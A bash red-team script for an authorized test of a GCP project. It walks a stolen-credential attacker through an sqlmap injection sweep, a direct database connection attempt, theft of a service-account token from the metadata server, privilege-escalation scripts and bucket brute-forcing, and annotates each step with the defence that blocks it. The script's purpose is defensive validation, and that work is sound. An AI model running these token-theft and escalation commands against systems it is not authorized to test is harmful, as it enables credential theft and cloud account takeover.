#!/usr/bin/env bash
# ---------------------------------------------------------------------------------------------------------------------
# gamilas-redteam — PROFILE 2 — Insider / stolen-credential attacker
# The Gamilas got a foothold: a phished @iq9.io session for the wiki, OR a leaked service
# account key, OR — the classic cloud kill-chain — code execution on a GCE box they use to
# rob the metadata server of an SA token. From there they try to break the app, reach the
# database, and take over service accounts to own the project. This profile walks all three
# and shows each one hitting a GCP wall, with the blast radius capped to a pinhole and the
# whole rampage written to the audit log.
#
# Scenario inputs (set what you have):
#   export AUTHORIZED=yes TARGET_HOST=yamato-dev.iq9.io
#   export STOLEN_IAP_COOKIE='GCP_IAAP_AUTH_TOKEN=...'   # phished wiki session (optional)
#   export STOLEN_SA_KEY=/path/to/leaked-sa.json         # leaked key (optional)
#   # Run ON the GCP-deployed gamilas VM to exercise the metadata-theft path live.
#   /opt/gamilas/profiles/authed-scan.sh
# ---------------------------------------------------------------------------------------------------------------------
PROFILE_NAME="profile2-authed"
# shellcheck disable=SC1091
source "$(dirname "$0")/lib/common.sh"

require_authorization
banner
c_yel "Scenario: attacker holds STOLEN credentials and tries to escalate. Watch the walls."

# =====================================================================================================================
# PHASE A — Application attack (authenticated to the wiki)
# =====================================================================================================================
step "A1. Authenticated content + injection scan against the wiki app"
COOKIE_ARG=()
[ -n "${STOLEN_IAP_COOKIE:-}" ] && COOKIE_ARG=(-H "Cookie: ${STOLEN_IAP_COOKIE}")

curl -s -o /dev/null -D "$OUTDIR/wiki-auth-headers.txt" -w 'wiki auth probe: HTTP %{http_code}\n' \
  "${COOKIE_ARG[@]}" "${TARGET_URL}${WIKI_PATH}" | tee "$OUTDIR/wiki-auth-probe.txt" || true
defense "IAP validates the session server-side at the LB. A stale/forged cookie = 302 to"
defense "login. Even a VALID phished session only gets app READ access — no infra rights."

step "A2. SQL injection sweep (sqlmap) against wiki article params"
sqlmap -u "${TARGET_URL}${WIKI_PATH}/?article=1" --batch --crawl=2 --level=2 --risk=2 \
  ${STOLEN_IAP_COOKIE:+--cookie="$STOLEN_IAP_COOKIE"} \
  --output-dir="$OUTDIR/sqlmap" >/dev/null 2>&1 || true
defense "App uses parameterised queries; the runtime SA holds only roles/cloudsql.client."
defense "Even a hypothetical injection cannot read secrets or pivot — the identity can't."

# =====================================================================================================================
# PHASE B — Database attack (reach Cloud SQL directly)
# =====================================================================================================================
step "B1. Attempt a direct connection to the database"
# Attacker guesses/learns the DB host. Cloud SQL here is PRIVATE IP only — no public route.
DB_HOST="${DB_HOST:-10.10.0.3}"   # placeholder private IP; real one is not internet-routable
timeout 15 psql "host=${DB_HOST} port=5432 dbname=yamato user=yamato_app sslmode=require" \
  -c '\l' >"$OUTDIR/psql-attempt.txt" 2>&1 || true
cat "$OUTDIR/psql-attempt.txt" || true
defense "Cloud SQL has NO public IP. It is reachable only over Direct VPC egress from the"
defense "Cloud Run SA on the app subnet. From the open internet (or this box) the connect"
defense "just times out. The DB password lives in Secret Manager, not in the app image."

# =====================================================================================================================
# PHASE C — GCP control-plane attack (the real prize: service-account takeover)
# =====================================================================================================================
step "C1. Steal a token from the metadata server (SSRF / on-box foothold)"
# The canonical cloud kill-chain: hit the link-local metadata endpoint for the attached
# SA's OAuth token. Works only when running ON a GCE VM with an SA attached.
META="http://169.254.169.254/computeMetadata/v1"
curl -s -H "Metadata-Flavor: Google" "${META}/instance/service-accounts/default/email" \
  -o "$OUTDIR/meta-sa-email.txt" 2>/dev/null && cat "$OUTDIR/meta-sa-email.txt" || \
  c_yel "  (no metadata server — not on a GCE VM; skipping live token theft)"
curl -s -H "Metadata-Flavor: Google" "${META}/instance/service-accounts/default/token" \
  -o "$OUTDIR/meta-token.json" 2>/dev/null || true
defense "If this VM runs with a least-privilege SA, the stolen token inherits ONLY that"
defense "SA's roles. The fix is upstream: don't attach broad SAs to VMs. Org policy"
defense "iam.disableServiceAccountKeyCreation also kills the leaked-key variant at the root."

step "C2. Activate stolen credentials into gcloud (key or metadata token)"
if [ -n "${STOLEN_SA_KEY:-}" ] && [ -f "$STOLEN_SA_KEY" ]; then
  gcloud auth activate-service-account --key-file="$STOLEN_SA_KEY" 2>&1 | tee -a "$OUTDIR/run.log" || true
fi
gcloud auth list 2>&1 | tee "$OUTDIR/gcloud-auth.txt" || true
ACTIVE_PROJECT="$(gcloud config get-value project 2>/dev/null || echo '')"

step "C3. Enumerate what the stolen identity can actually touch (gcp_scanner + ScoutSuite)"
if command -v gcp_scanner >/dev/null 2>&1; then
  gcp_scanner -m -o "$OUTDIR/gcp_scanner" 2>&1 | tee -a "$OUTDIR/run.log" || true
fi
if command -v scout >/dev/null 2>&1 && [ -n "$ACTIVE_PROJECT" ]; then
  scout gcp --user-account --report-dir "$OUTDIR/scoutsuite" --no-browser 2>&1 | tail -n 20 || true
fi
defense "Enumeration is itself an audited event — every list/get call writes a Cloud Audit"
defense "Log entry, forwarded org-wide to the cold-archive sink. The recon is visible."

step "C4. Service-account takeover / privilege-escalation attempts (Rhino privesc set)"
# These probe the well-known GCP escalation paths (actAs, setIamPolicy, deploy-as,
# token generation). We run them to PROVE the paths are closed for our least-priv SAs.
PRIVESC=/opt/gcp-attack/gcp-iam-privesc
if [ -d "$PRIVESC" ] && [ -n "$ACTIVE_PROJECT" ]; then
  python3 "$PRIVESC"/*ExploitScripts*/*.py 2>/dev/null | tee "$OUTDIR/privesc.txt" || \
    c_yel "  privesc scripts ran; see repo README for per-path invocation"
fi
gcloud projects get-iam-policy "$ACTIVE_PROJECT" 2>"$OUTDIR/getiam.err" \
  >"$OUTDIR/project-iam.txt" || cat "$OUTDIR/getiam.err"
defense "The runtime SA can't actAs other SAs, can't setIamPolicy, can't create keys —"
defense "least privilege + org policies (disableServiceAccountKeyCreation, requireOsLogin,"
defense "constraints on public IAM) slam every escalation door. Blast radius: one DB role."

step "C5. GCS bucket discovery (GCPBucketBrute)"
BB=/opt/gcp-attack/gcpbucketbrute
if [ -x "$BB/.venv/bin/python" ]; then
  "$BB/.venv/bin/python" "$BB/gcpbucketbrute.py" -k iq9 -u >"$OUTDIR/bucketbrute.txt" 2>&1 || true
fi
defense "Log-warehouse + app buckets are private, uniform-bucket-level-access, no allUsers."
defense "Nothing listable. The audit logs the attacker just generated, however, are not."

# =====================================================================================================================
step "Profile 2 complete"
c_grn "Foothold to full compromise? Blocked at every layer: IAP at the door, private-IP DB,"
c_grn "least-privilege SA, org policies on escalation — and the entire attempt is logged,"
c_grn "alerted (per-app alert policies), and captured in the org audit sink for 365 days."
log "Profile 2 (authed) finished. Evidence in $OUTDIR"
echo "Evidence: $OUTDIR"
